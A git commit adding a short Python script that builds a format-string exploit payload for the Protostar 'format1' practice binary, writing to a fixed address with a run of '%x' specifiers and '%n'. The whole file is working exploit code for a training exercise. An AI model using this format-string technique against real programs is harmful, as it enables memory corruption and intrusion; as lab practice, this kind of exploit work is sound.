219c148babc6b3266d6dd0feb38ffb9147185025
ockamey <ockamey@gmail.com>
2023-09-03 22:43:01 +0200

    format1

---
+++ format1.py
@@ -0,0 +1,13 @@
+########################################
+# Usage: 
+# /opt/protostar/bin/format1 $(python format1.py)
+########################################
+import struct
+
+lettersBeginning = 'AAAAAA'
+address = struct.pack("I", 0x08049638)
+lettersEnd = 'BBB'
+padding = '%x ' * 133 + '%n'
+
+payload = lettersBeginning + address + lettersEnd + padding
+print(payload)
